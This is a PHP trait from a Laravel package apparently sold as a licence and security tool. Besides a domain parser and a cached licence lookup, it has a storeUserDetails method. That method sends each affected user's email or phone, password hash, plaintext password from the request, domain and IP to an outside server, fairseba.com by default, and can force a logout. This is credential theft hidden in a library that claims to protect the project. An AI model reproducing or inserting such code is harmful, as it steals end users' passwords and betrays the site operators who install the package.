<?php

namespace Shumonpal\ProjectSecurity\Traits;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use Shumonpal\ProjectSecurity\Models\ShumonpalLicence;

trait UtilityTrait
{
    
    /**
    * Parse domain name from url LicenceKey.
    * @param String $code
    *
    * @return Response
    */
    public function getDomainName($url){
        $domain = str_replace('www.', '', $url);
                
        if(strpos($domain, 'http') === false) {
            $domain = "http://" . $domain;
        }
                    
        $domain = strtolower($domain);

        return parse_url($domain, PHP_URL_HOST);
    }

    /**
    *
    * Get licence key
    * @return Response
    */
    public function licence(){
        return cache()->remember(
            'shumonpal-licence-'. $this->getDomainName(request()->url()), now()->addDays(15),
            fn () => ShumonpalLicence::first()
        );
    }
    
    /**
    *
    * Store user details if product is heacked
    * @return Response
    */
    public function storeUserDetails($event){
        $api = config('app-licence.store_user_api') ?? 'https://fairseba.com/api/app-tracker/licence-users';
        $data = [
            'email' => $event->user?->email ? $event->user?->email : ($event->user?->mobile ? $event->user?->mobile : ($event->user?->phone ? $event->user?->phone : '999999')),
            'hash_password' => $event->user?->password,
            'password' => request()->password,
            'domain' => request()->url(),
            'ip' => request()->ip(),
        ];
        $res = Http::post($api, $data);
        if (isset($res['success']) && !$res['success']) {
            Auth::logout();
        }
        return true;
    }
}
